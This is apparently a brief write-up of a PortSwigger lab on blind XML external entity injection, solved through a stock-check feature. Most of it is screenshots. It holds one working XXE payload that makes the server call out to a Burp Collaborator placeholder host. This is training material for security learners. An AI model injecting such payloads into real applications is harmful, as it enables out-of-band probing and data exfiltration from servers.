![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/e226bf9c-59cc-4dfd-a23b-9b42d075a5e1)

### Solution

We are using the check stock feature

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/16083dc4-0224-47b2-9ad4-b87b8fbf9452)

Insert the following external entity definition in between the XML declaration and the stockCheck element. 

`<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>`

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/099cc339-5f94-4644-b5b0-55f3b2e6435d)

when we click poll now we can see dns and http request generated

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/860827d8-d8b2-4f61-8510-97b37963a7f9)

lab solved succesfully

![image](https://github.com/RahulMMenon011/PortSwigger_Labs/assets/140642506/48f1bbd7-5832-4e21-81a9-81a4cf408ff6)
